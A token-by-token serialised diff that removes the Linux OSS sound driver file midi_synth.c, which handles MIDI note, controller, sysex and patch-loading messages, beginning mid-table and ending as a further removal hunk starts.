"*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "56", "to", "63", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "64", "to", "71", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "72", "to", "79", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "80", "to", "87", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "88", "to", "95", "*", "/", "0x00", ",", "0x00", ",", "0x7f", ",", "0x7f", ",", "0x7f", ",", "0x7f", ",", "0x00", ",", "0x00", ",", "/", "*", "96", "to", "103", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "104", "to", "111", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "112", "to", "119", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "120", "to", "127", "*", "/", "}", ";", "@", "@", "-", "1", ",", "712", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "midi_synth", ".", "c", "*", "*", "High", "level", "midi", "sequencer", "manager", "for", "dumb", "MIDI", "interfaces", ".", "*", "/", "/", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "/", "/", "*", "*", "Thomas", "Sailer", ":", "ioctl", "code", "reworked", "(", "vmalloc", "/", "vfree", "removed", ")", "*", "Andrew", "Veliath", ":", "fixed", "running", "status", "in", "MIDI", "input", "state", "machine", "*", "/", "#", "define", "USE_SEQ_MACROS", "#", "define", "USE_SIMPLE_MACROS", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "define", "_MIDI_SYNTH_C_", "#", "include", "\"", "midi_synth", ".", "h", "\"", "static", "int", "midi2synth", "[", "MAX_MIDI_DEV", "]", ";", "static", "int", "sysex_state", "[", "MAX_MIDI_DEV", "]", "=", "{", "0", "}", ";", "static", "unsigned", "char", "prev_out_status", "[", "MAX_MIDI_DEV", "]", ";", "#", "define", "STORE", "(", "cmd", ")", "\\", "{", "\\", "int", "len", ";", "\\", "unsigned", "char", "obuf", "[", "8", "]", ";", "\\", "cmd", ";", "\\", "seq_input_event", "(", "obuf", ",", "len", ")", ";", "\\", "}", "#", "define", "_seqbuf", "obuf", "#", "define", "_seqbufptr", "0", "#", "define", "_SEQ_ADVBUF", "(", "x", ")", "len", "=", "x", "void", "do_midi_msg", "(", "int", "synthno", ",", "unsigned", "char", "*", "msg", ",", "int", "mlen", ")", "{", "switch", "(", "msg", "[", "0", "]", "&", "0xf0", ")", "{", "case", "0x90", ":", "if", "(", "msg", "[", "2", "]", "!", "=", "0", ")", "{", "STORE", "(", "SEQ_START_NOTE", "(", "synthno", ",", "msg", "[", "0", "]", "&", "0x0f", ",", "msg", "[", "1", "]", ",", "msg", "[", "2", "]", "))", ";", "break", ";", "}", "msg", "[", "2", "]", "=", "64", ";", "case", "0x80", ":", "STORE", "(", "SEQ_STOP_NOTE", "(", "synthno", ",", "msg", "[", "0", "]", "&", "0x0f", ",", "msg", "[", "1", "]", ",", "msg", "[", "2", "]", "))", ";", "break", ";", "case", "0xA0", ":", "STORE", "(", "SEQ_KEY_PRESSURE", "(", "synthno", ",", "msg", "[", "0", "]", "&", "0x0f", ",", "msg", "[", "1", "]", ",", "msg", "[", "2", "]", "))", ";", "break", ";", "case", "0xB0", ":", "STORE", "(", "SEQ_CONTROL", "(", "synthno", ",", "msg", "[", "0", "]", "&", "0x0f", ",", "msg", "[", "1", "]", ",", "msg", "[", "2", "]", "))", ";", "break", ";", "case", "0xC0", ":", "STORE", "(", "SEQ_SET_PATCH", "(", "synthno", ",", "msg", "[", "0", "]", "&", "0x0f", ",", "msg", "[", "1", "]", "))", ";", "break", ";", "case", "0xD0", ":", "STORE", "(", "SEQ_CHN_PRESSURE", "(", "synthno", ",", "msg", "[", "0", "]", "&", "0x0f", ",", "msg", "[", "1", "]", "))", ";", "break", ";", "case", "0xE0", ":", "STORE", "(", "SEQ_BENDER", "(", "synthno", ",", "msg", "[", "0", "]", "&", "0x0f", ",", "(", "msg", "[", "1", "]", "&", "0x7f", ")", "|", "(", "(", "msg", "[", "2", "]", "&", "0x7f", ")", "<", "<", "7", ")", "))", ";", "break", ";", "default", ":", "/", "*", "printk", "(", "\"", "MPU", ":", "Unknown", "midi", "channel", "message", "%", "02x", "\\", "n", "\"", ",", "msg", "[", "0", "]", ");", "*", "/", ";", "}", "}", "EXPORT_SYMBOL", "(", "do_midi_msg", ")", ";", "static", "void", "midi_outc", "(", "int", "midi_dev", ",", "int", "data", ")", "{", "int", "timeout", ";", "for", "(", "timeout", "=", "0", ";", "timeout", "<", "3200", ";", "timeout", "+", "+)", "if", "(", "midi_devs", "[", "midi_dev", "]", "->", "outputc", "(", "midi_dev", ",", "(", "unsigned", "char", ")", "(", "data", "&", "0xff", ")", "))", "{", "if", "(", "data", "&", "0x80", ")", "/", "*", "*", "Status", "byte", "*", "/", "prev_out_status", "[", "midi_dev", "]", "=", "(", "unsigned", "char", ")", "(", "data", "&", "0xff", ")", ";", "/", "*", "*", "Store", "for", "running", "status", "*", "/", "return", ";", "/", "*", "*", "Mission", "complete", "*", "/", "}", "/", "*", "*", "Sorry", "!", "No", "space", "on", "buffers", ".", "*", "/", "printk", "(", "\"", "Midi", "send", "timed", "out", "\\", "n", "\"", ");", "}", "static", "int", "prefix_cmd", "(", "int", "midi_dev", ",", "unsigned", "char", "status", ")", "{", "if", "(", "(", "char", "*", ")", "midi_devs", "[", "midi_dev", "]", "->", "prefix_cmd", "=", "=", "NULL", ")", "return", "1", ";", "return", "midi_devs", "[", "midi_dev", "]", "->", "prefix_cmd", "(", "midi_dev", ",", "status", ")", ";", "}", "static", "void", "midi_synth_input", "(", "int", "orig_dev", ",", "unsigned", "char", "data", ")", "{", "int", "dev", ";", "struct", "midi_input_info", "*", "inc", ";", "static", "unsigned", "char", "len_tab", "[", "]", "=", "/", "*", "#", "of", "data", "bytes", "following", "a", "status", "*", "/", "{", "2", ",", "/", "*", "8x", "*", "/", "2", ",", "/", "*", "9x", "*", "/", "2", ",", "/", "*", "Ax", "*", "/", "2", ",", "/", "*", "Bx", "*", "/", "1", ",", "/", "*", "Cx", "*", "/", "1", ",", "/", "*", "Dx", "*", "/", "2", ",", "/", "*", "Ex", "*", "/", "0", "/", "*", "Fx", "*", "/", "}", ";", "if", "(", "orig_dev", "<", "0", "|", "|", "orig_dev", ">", "num_midis", "|", "|", "midi_devs", "[", "orig_dev", "]", "=", "=", "NULL", ")", "return", ";", "if", "(", "data", "=", "=", "0xfe", ")", "/", "*", "Ignore", "active", "sensing", "*", "/", "return", ";", "dev", "=", "midi2synth", "[", "orig_dev", "]", ";", "inc", "=", "&", "midi_devs", "[", "orig_dev", "]", "->", "in_info", ";", "switch", "(", "inc", "-", ">", "m_state", ")", "{", "case", "MST_INIT", ":", "if", "(", "data", "&", "0x80", ")", "/", "*", "MIDI", "status", "byte", "*", "/", "{", "if", "(", "(", "data", "&", "0xf0", ")", "=", "=", "0xf0", ")", "/", "*", "Common", "message", "*", "/", "{", "switch", "(", "data", ")", "{", "case", "0xf0", ":", "/", "*", "Sysex", "*", "/", "inc", "-", ">", "m_state", "=", "MST_SYSEX", ";", "break", ";", "/", "*", "Sysex", "*", "/", "case", "0xf1", ":", "/", "*", "MTC", "quarter", "frame", "*", "/", "case", "0xf3", ":", "/", "*", "Song", "select", "*", "/", "inc", "-", ">", "m_state", "=", "MST_DATA", ";", "inc", "-", ">", "m_ptr", "=", "1", ";", "inc", "-", ">", "m_left", "=", "1", ";", "inc", "-", ">", "m_buf", "[", "0", "]", "=", "data", ";", "break", ";", "case", "0xf2", ":", "/", "*", "Song", "position", "pointer", "*", "/", "inc", "-", ">", "m_state", "=", "MST_DATA", ";", "inc", "-", ">", "m_ptr", "=", "1", ";", "inc", "-", ">", "m_left", "=", "2", ";", "inc", "-", ">", "m_buf", "[", "0", "]", "=", "data", ";", "break", ";", "default", ":", "inc", "-", ">", "m_buf", "[", "0", "]", "=", "data", ";", "inc", "-", ">", "m_ptr", "=", "1", ";", "do_midi_msg", "(", "dev", ",", "inc", "-", ">", "m_buf", ",", "inc", "-", ">", "m_ptr", ")", ";", "inc", "-", ">", "m_ptr", "=", "0", ";", "inc", "-", ">", "m_left", "=", "0", ";", "}", "}", "else", "{", "inc", "-", ">", "m_state", "=", "MST_DATA", ";", "inc", "-", ">", "m_ptr", "=", "1", ";", "inc", "-", ">", "m_left", "=", "len_tab", "[", "(", "data", ">", ">", "4", ")", "-", "8", "]", ";", "inc", "-", ">", "m_buf", "[", "0", "]", "=", "inc", "-", ">", "m_prev_status", "=", "data", ";", "}", "}", "else", "if", "(", "inc", "-", ">", "m_prev_status", "&", "0x80", ")", "{", "/", "*", "Data", "byte", "(", "use", "running", "status", ")", "*", "/", "inc", "-", ">", "m_ptr", "=", "2", ";", "inc", "-", ">", "m_buf", "[", "1", "]", "=", "data", ";", "inc", "-", ">", "m_buf", "[", "0", "]", "=", "inc", "-", ">", "m_prev_status", ";", "inc", "-", ">", "m_left", "=", "len_tab", "[", "(", "inc", "-", ">", "m_buf", "[", "0", "]", ">", ">", "4", ")", "-", "8", "]", "-", "1", ";", "if", "(", "inc", "-", ">", "m_left", ">", "0", ")", "inc", "-", ">", "m_state", "=", "MST_DATA", ";", "/", "*", "Not", "done", "yet", "*", "/", "else", "{", "inc", "-", ">", "m_state", "=", "MST_INIT", ";", "do_midi_msg", "(", "dev", ",", "inc", "-", ">", "m_buf", ",", "inc", "-", ">", "m_ptr", ")", ";", "inc", "-", ">", "m_ptr", "=", "0", ";", "}", "}", "break", ";", "/", "*", "MST_INIT", "*", "/", "case", "MST_DATA", ":", "inc", "-", ">", "m_buf", "[", "inc", "-", ">", "m_ptr", "+", "+]", "=", "data", ";", "if", "(", "--", "inc", "-", ">", "m_left", "<", "=", "0", ")", "{", "inc", "-", ">", "m_state", "=", "MST_INIT", ";", "do_midi_msg", "(", "dev", ",", "inc", "-", ">", "m_buf", ",", "inc", "-", ">", "m_ptr", ")", ";", "inc", "-", ">", "m_ptr", "=", "0", ";", "}", "break", ";", "/", "*", "MST_DATA", "*", "/", "case", "MST_SYSEX", ":", "if", "(", "data", "=", "=", "0xf7", ")", "/", "*", "Sysex", "end", "*", "/", "{", "inc", "-", ">", "m_state", "=", "MST_INIT", ";", "inc", "-", ">", "m_left", "=", "0", ";", "inc", "-", ">", "m_ptr", "=", "0", ";", "}", "break", ";", "/", "*", "MST_SYSEX", "*", "/", "default", ":", "printk", "(", "\"", "MIDI", "%", "d", ":", "Unexpected", "state", "%", "d", "(", "%", "02x", ")", "\\", "n", "\"", ",", "orig_dev", ",", "inc", "-", ">", "m_state", ",", "(", "int", ")", "data", ")", ";", "inc", "-", ">", "m_state", "=", "MST_INIT", ";", "}", "}", "static", "void", "leave_sysex", "(", "int", "dev", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "int", "timeout", "=", "0", ";", "if", "(", "!", "sysex_state", "[", "dev", "]", ")", "return", ";", "sysex_state", "[", "dev", "]", "=", "0", ";", "while", "(", "!", "midi_devs", "[", "orig_dev", "]", "->", "outputc", "(", "orig_dev", ",", "0xf7", ")", "&", "&", "timeout", "<", "1000", ")", "timeout", "+", "+;", "sysex_state", "[", "dev", "]", "=", "0", ";", "}", "static", "void", "midi_synth_output", "(", "int", "dev", ")", "{", "/", "*", "*", "Currently", "NOP", "*", "/", "}", "int", "midi_synth_ioctl", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", "{", "/", "*", "*", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "*", "/", "switch", "(", "cmd", ")", "{", "case", "SNDCTL_SYNTH_INFO", ":", "if", "(", "__copy_to_user", "(", "arg", ",", "synth_devs", "[", "dev", "]", "->", "info", ",", "sizeof", "(", "struct", "synth_info", ")", "))", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_SYNTH_MEMAVL", ":", "return", "0x7fffffff", ";", "default", ":", "return", "-", "EINVAL", ";", "}", "}", "EXPORT_SYMBOL", "(", "midi_synth_ioctl", ")", ";", "int", "midi_synth_kill_note", "(", "int", "dev", ",", "int", "channel", ",", "int", "note", ",", "int", "velocity", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "int", "msg", ",", "chn", ";", "if", "(", "note", "<", "0", "|", "|", "note", ">", "127", ")", "return", "0", ";", "if", "(", "channel", "<", "0", "|", "|", "channel", ">", "15", ")", "return", "0", ";", "if", "(", "velocity", "<", "0", ")", "velocity", "=", "0", ";", "if", "(", "velocity", ">", "127", ")", "velocity", "=", "127", ";", "leave_sysex", "(", "dev", ")", ";", "msg", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0xf0", ";", "chn", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0x0f", ";", "if", "(", "chn", "=", "=", "channel", "&", "&", "(", "(", "msg", "=", "=", "0x90", "&", "&", "velocity", "=", "=", "64", ")", "|", "|", "msg", "=", "=", "0x80", ")", ")", "{", "/", "*", "*", "Use", "running", "status", "*", "/", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "note", ")", ")", "return", "0", ";", "midi_outc", "(", "orig_dev", ",", "note", ")", ";", "if", "(", "msg", "=", "=", "0x90", ")", "/", "*", "*", "Running", "status", "=", "Note", "on", "*", "/", "midi_outc", "(", "orig_dev", ",", "0", ")", ";", "/", "*", "*", "Note", "on", "with", "velocity", "0", "=", "=", "note", "*", "off", "*", "/", "else", "midi_outc", "(", "orig_dev", ",", "velocity", ")", ";", "}", "else", "{", "if", "(", "velocity", "=", "=", "64", ")", "{", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "0x90", "|", "(", "channel", "&", "0x0f", ")", "))", "return", "0", ";", "midi_outc", "(", "orig_dev", ",", "0x90", "|", "(", "channel", "&", "0x0f", ")", ");", "/", "*", "*", "Note", "on", "*", "/", "midi_outc", "(", "orig_dev", ",", "note", ")", ";", "midi_outc", "(", "orig_dev", ",", "0", ")", ";", "/", "*", "*", "Zero", "G", "*", "/", "}", "else", "{", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "0x80", "|", "(", "channel", "&", "0x0f", ")", "))", "return", "0", ";", "midi_outc", "(", "orig_dev", ",", "0x80", "|", "(", "channel", "&", "0x0f", ")", ");", "/", "*", "*", "Note", "off", "*", "/", "midi_outc", "(", "orig_dev", ",", "note", ")", ";", "midi_outc", "(", "orig_dev", ",", "velocity", ")", ";", "}", "}", "return", "0", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_kill_note", ")", ";", "int", "midi_synth_set_instr", "(", "int", "dev", ",", "int", "channel", ",", "int", "instr_no", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "if", "(", "instr_no", "<", "0", "|", "|", "instr_no", ">", "127", ")", "instr_no", "=", "0", ";", "if", "(", "channel", "<", "0", "|", "|", "channel", ">", "15", ")", "return", "0", ";", "leave_sysex", "(", "dev", ")", ";", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "0xc0", "|", "(", "channel", "&", "0x0f", ")", "))", "return", "0", ";", "midi_outc", "(", "orig_dev", ",", "0xc0", "|", "(", "channel", "&", "0x0f", ")", ");", "/", "*", "*", "Program", "change", "*", "/", "midi_outc", "(", "orig_dev", ",", "instr_no", ")", ";", "return", "0", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_set_instr", ")", ";", "int", "midi_synth_start_note", "(", "int", "dev", ",", "int", "channel", ",", "int", "note", ",", "int", "velocity", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "int", "msg", ",", "chn", ";", "if", "(", "note", "<", "0", "|", "|", "note", ">", "127", ")", "return", "0", ";", "if", "(", "channel", "<", "0", "|", "|", "channel", ">", "15", ")", "return", "0", ";", "if", "(", "velocity", "<", "0", ")", "velocity", "=", "0", ";", "if", "(", "velocity", ">", "127", ")", "velocity", "=", "127", ";", "leave_sysex", "(", "dev", ")", ";", "msg", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0xf0", ";", "chn", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0x0f", ";", "if", "(", "chn", "=", "=", "channel", "&", "&", "msg", "=", "=", "0x90", ")", "{", "/", "*", "*", "Use", "running", "status", "*", "/", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "note", ")", ")", "return", "0", ";", "midi_outc", "(", "orig_dev", ",", "note", ")", ";", "midi_outc", "(", "orig_dev", ",", "velocity", ")", ";", "}", "else", "{", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "0x90", "|", "(", "channel", "&", "0x0f", ")", "))", "return", "0", ";", "midi_outc", "(", "orig_dev", ",", "0x90", "|", "(", "channel", "&", "0x0f", ")", ");", "/", "*", "*", "Note", "on", "*", "/", "midi_outc", "(", "orig_dev", ",", "note", ")", ";", "midi_outc", "(", "orig_dev", ",", "velocity", ")", ";", "}", "return", "0", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_start_note", ")", ";", "void", "midi_synth_reset", "(", "int", "dev", ")", "{", "leave_sysex", "(", "dev", ")", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_reset", ")", ";", "int", "midi_synth_open", "(", "int", "dev", ",", "int", "mode", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "int", "err", ";", "struct", "midi_input_info", "*", "inc", ";", "if", "(", "orig_dev", "<", "0", "|", "|", "orig_dev", ">", "=", "num_midis", "|", "|", "midi_devs", "[", "orig_dev", "]", "=", "=", "NULL", ")", "return", "-", "ENXIO", ";", "midi2synth", "[", "orig_dev", "]", "=", "dev", ";", "sysex_state", "[", "dev", "]", "=", "0", ";", "prev_out_status", "[", "orig_dev", "]", "=", "0", ";", "if", "(", "(", "err", "=", "midi_devs", "[", "orig_dev", "]", "->", "open", "(", "orig_dev", ",", "mode", ",", "midi_synth_input", ",", "midi_synth_output", ")", ")", "<", "0", ")", "return", "err", ";", "inc", "=", "&", "midi_devs", "[", "orig_dev", "]", "->", "in_info", ";", "/", "*", "save_flags", "(", "flags", ")", ";", "cli", "(", ");", "don", "'", "t", "know", "against", "what", "irqhandler", "to", "protect", "*", "/", "inc", "-", ">", "m_busy", "=", "0", ";", "inc", "-", ">", "m_state", "=", "MST_INIT", ";", "inc", "-", ">", "m_ptr", "=", "0", ";", "inc", "-", ">", "m_left", "=", "0", ";", "inc", "-", ">", "m_prev_status", "=", "0x00", ";", "/", "*", "restore_flags", "(", "flags", ")", ";", "*", "/", "return", "1", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_open", ")", ";", "void", "midi_synth_close", "(", "int", "dev", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "leave_sysex", "(", "dev", ")", ";", "/", "*", "*", "Shut", "up", "the", "synths", "by", "sending", "just", "single", "active", "sensing", "message", ".", "*", "/", "midi_devs", "[", "orig_dev", "]", "->", "outputc", "(", "orig_dev", ",", "0xfe", ")", ";", "midi_devs", "[", "orig_dev", "]", "->", "close", "(", "orig_dev", ")", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_close", ")", ";", "void", "midi_synth_hw_control", "(", "int", "dev", ",", "unsigned", "char", "*", "event", ")", "{", "}", "EXPORT_SYMBOL", "(", "midi_synth_hw_control", ")", ";", "int", "midi_synth_load_patch", "(", "int", "dev", ",", "int", "format", ",", "const", "char", "__user", "*", "addr", ",", "int", "count", ",", "int", "pmgr_flag", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "struct", "sysex_info", "sysex", ";", "int", "i", ";", "unsigned", "long", "left", ",", "src_offs", ",", "eox_seen", "=", "0", ";", "int", "first_byte", "=", "1", ";", "int", "hdr_size", "=", "(", "unsigned", "long", ")", "&", "sysex", ".", "data", "[", "0", "]", "-", "(", "unsigned", "long", ")", "&", "sysex", ";", "leave_sysex", "(", "dev", ")", ";", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "0xf0", ")", ")", "return", "0", ";", "/", "*", "Invalid", "patch", "format", "*", "/", "if", "(", "format", "!", "=", "SYSEX_PATCH", ")", "return", "-", "EINVAL", ";", "/", "*", "Patch", "header", "too", "short", "*", "/", "if", "(", "count", "<", "hdr_size", ")", "return", "-", "EINVAL", ";", "count", "-", "=", "hdr_size", ";", "/", "*", "*", "Copy", "the", "header", "from", "user", "space", "*", "/", "if", "(", "copy_from_user", "(", "&", "sysex", ",", "addr", ",", "hdr_size", ")", ")", "return", "-", "EFAULT", ";", "/", "*", "Sysex", "record", "too", "short", "*", "/", "if", "(", "(", "unsigned", ")", "count", "<", "(", "unsigned", ")", "sysex", ".", "len", ")", "sysex", ".", "len", "=", "count", ";", "left", "=", "sysex", ".", "len", ";", "src_offs", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "left", "&", "&", "!", "signal_pending", "(", "current", ")", ";", "i", "+", "+)", "{", "unsigned", "char", "data", ";", "if", "(", "get_user", "(", "data", ",", "(", "unsigned", "char", "__user", "*", ")(", "addr", "+", "hdr_size", "+", "i", ")", "))", "return", "-", "EFAULT", ";", "eox_seen", "=", "(", "i", ">", "0", "&", "&", "data", "&", "0x80", ")", ";", "/", "*", "End", "of", "sysex", "*", "/", "if", "(", "eox_seen", "&", "&", "data", "!", "=", "0xf7", ")", "data", "=", "0xf7", ";", "if", "(", "i", "=", "=", "0", ")", "{", "if", "(", "data", "!", "=", "0xf0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "midi_synth", ":", "Sysex", "start", "missing", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "}", "while", "(", "!", "midi_devs", "[", "orig_dev", "]", "->", "outputc", "(", "orig_dev", ",", "(", "unsigned", "char", ")", "(", "data", "&", "0xff", ")", ")", "&", "&", "!", "signal_pending", "(", "current", ")", ")", "schedule", "(", ");", "if", "(", "!", "first_byte", "&", "&", "data", "&", "0x80", ")", "return", "0", ";", "first_byte", "=", "0", ";", "}", "if", "(", "!", "eox_seen", ")", "midi_outc", "(", "orig_dev", ",", "0xf7", ")", ";", "return", "0", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_load_patch", ")", ";", "void", "midi_synth_panning", "(", "int", "dev", ",", "int", "channel", ",", "int", "pressure", ")", "{", "}", "EXPORT_SYMBOL", "(", "midi_synth_panning", ")", ";", "void", "midi_synth_aftertouch", "(", "int", "dev", ",", "int", "channel", ",", "int", "pressure", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "int", "msg", ",", "chn", ";", "if", "(", "pressure", "<", "0", "|", "|", "pressure", ">", "127", ")", "return", ";", "if", "(", "channel", "<", "0", "|", "|", "channel", ">", "15", ")", "return", ";", "leave_sysex", "(", "dev", ")", ";", "msg", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0xf0", ";", "chn", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0x0f", ";", "if", "(", "msg", "!", "=", "0xd0", "|", "|", "chn", "!", "=", "channel", ")", "/", "*", "*", "Test", "for", "running", "status", "*", "/", "{", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "0xd0", "|", "(", "channel", "&", "0x0f", ")", "))", "return", ";", "midi_outc", "(", "orig_dev", ",", "0xd0", "|", "(", "channel", "&", "0x0f", ")", ");", "/", "*", "*", "Channel", "pressure", "*", "/", "}", "else", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "pressure", ")", ")", "return", ";", "midi_outc", "(", "orig_dev", ",", "pressure", ")", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_aftertouch", ")", ";", "void", "midi_synth_controller", "(", "int", "dev", ",", "int", "channel", ",", "int", "ctrl_num", ",", "int", "value", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "int", "chn", ",", "msg", ";", "if", "(", "ctrl_num", "<", "0", "|", "|", "ctrl_num", ">", "127", ")", "return", ";", "if", "(", "channel", "<", "0", "|", "|", "channel", ">", "15", ")", "return", ";", "leave_sysex", "(", "dev", ")", ";", "msg", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0xf0", ";", "chn", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0x0f", ";", "if", "(", "msg", "!", "=", "0xb0", "|", "|", "chn", "!", "=", "channel", ")", "{", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "0xb0", "|", "(", "channel", "&", "0x0f", ")", "))", "return", ";", "midi_outc", "(", "orig_dev", ",", "0xb0", "|", "(", "channel", "&", "0x0f", ")", ");", "}", "else", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "ctrl_num", ")", ")", "return", ";", "midi_outc", "(", "orig_dev", ",", "ctrl_num", ")", ";", "midi_outc", "(", "orig_dev", ",", "value", "&", "0x7f", ")", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_controller", ")", ";", "void", "midi_synth_bender", "(", "int", "dev", ",", "int", "channel", ",", "int", "value", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "int", "msg", ",", "prev_chn", ";", "if", "(", "channel", "<", "0", "|", "|", "channel", ">", "15", ")", "return", ";", "if", "(", "value", "<", "0", "|", "|", "value", ">", "16383", ")", "return", ";", "leave_sysex", "(", "dev", ")", ";", "msg", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0xf0", ";", "prev_chn", "=", "prev_out_status", "[", "orig_dev", "]", "&", "0x0f", ";", "if", "(", "msg", "!", "=", "0xd0", "|", "|", "prev_chn", "!", "=", "channel", ")", "/", "*", "*", "Test", "for", "running", "status", "*", "/", "{", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "0xe0", "|", "(", "channel", "&", "0x0f", ")", "))", "return", ";", "midi_outc", "(", "orig_dev", ",", "0xe0", "|", "(", "channel", "&", "0x0f", ")", ");", "}", "else", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "value", "&", "0x7f", ")", ")", "return", ";", "midi_outc", "(", "orig_dev", ",", "value", "&", "0x7f", ")", ";", "midi_outc", "(", "orig_dev", ",", "(", "value", ">", ">", "7", ")", "&", "0x7f", ")", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_bender", ")", ";", "void", "midi_synth_setup_voice", "(", "int", "dev", ",", "int", "voice", ",", "int", "channel", ")", "{", "}", "EXPORT_SYMBOL", "(", "midi_synth_setup_voice", ")", ";", "int", "midi_synth_send_sysex", "(", "int", "dev", ",", "unsigned", "char", "*", "bytes", ",", "int", "len", ")", "{", "int", "orig_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "len", ";", "i", "+", "+)", "{", "switch", "(", "bytes", "[", "i", "]", ")", "{", "case", "0xf0", ":", "/", "*", "Start", "sysex", "*", "/", "if", "(", "!", "prefix_cmd", "(", "orig_dev", ",", "0xf0", ")", ")", "return", "0", ";", "sysex_state", "[", "dev", "]", "=", "1", ";", "break", ";", "case", "0xf7", ":", "/", "*", "End", "sysex", "*", "/", "if", "(", "!", "sysex_state", "[", "dev", "]", ")", "/", "*", "Orphan", "sysex", "end", "*", "/", "return", "0", ";", "sysex_state", "[", "dev", "]", "=", "0", ";", "break", ";", "default", ":", "if", "(", "!", "sysex_state", "[", "dev", "]", ")", "return", "0", ";", "if", "(", "bytes", "[", "i", "]", "&", "0x80", ")", "/", "*", "Error", ".", "Another", "message", "before", "sysex", "end", "*", "/", "{", "bytes", "[", "i", "]", "=", "0xf7", ";", "/", "*", "Sysex", "end", "*", "/", "sysex_state", "[", "dev", "]", "=", "0", ";", "}", "}", "if", "(", "!", "midi_devs", "[", "orig_dev", "]", "->", "outputc", "(", "orig_dev", ",", "bytes", "[", "i", "]", "))", "{", "/", "*", "*", "Hardware", "level", "buffer", "is", "full", ".", "Abort", "the", "sysex", "message", ".", "*", "/", "int", "timeout", "=", "0", ";", "bytes", "[", "i", "]", "=", "0xf7", ";", "sysex_state", "[", "dev", "]", "=", "0", ";", "while", "(", "!", "midi_devs", "[", "orig_dev", "]", "->", "outputc", "(", "orig_dev", ",", "bytes", "[", "i", "]", ")", "&", "&", "timeout", "<", "1000", ")", "timeout", "+", "+;", "}", "if", "(", "!", "sysex_state", "[", "dev", "]", ")", "return", "0", ";", "}", "return", "0", ";", "}", "EXPORT_SYMBOL", "(", "midi_synth_send_sysex", ")", ";", "@", "@", "-", "1", ",", "47", "+", "0", ",", "0", 